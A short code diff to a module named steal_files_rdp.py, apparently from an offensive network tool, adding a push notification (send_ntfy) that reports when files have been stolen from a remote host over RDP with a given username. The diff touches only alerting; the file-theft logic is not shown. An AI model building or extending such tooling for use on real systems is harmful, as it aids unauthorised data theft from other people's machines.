@@ -10,6 +10,7 @@ from threading import Timer
 from rich.console import Console
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="steal_files_rdp.py", level=logging.DEBUG)
@@ -157,6 +158,8 @@ class StealFilesRDP:
                                 success = True
                                 countfiles = len(remote_files)
                                 logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
+                                message = f"Successfully stolen {countfiles} files from {ip}:{port} using {username}, (RDP)"
+                                send_ntfy(message=message)
                             client.terminate()
                             if success:
                                 timer.cancel()  # Cancel the timer if the operation is successful
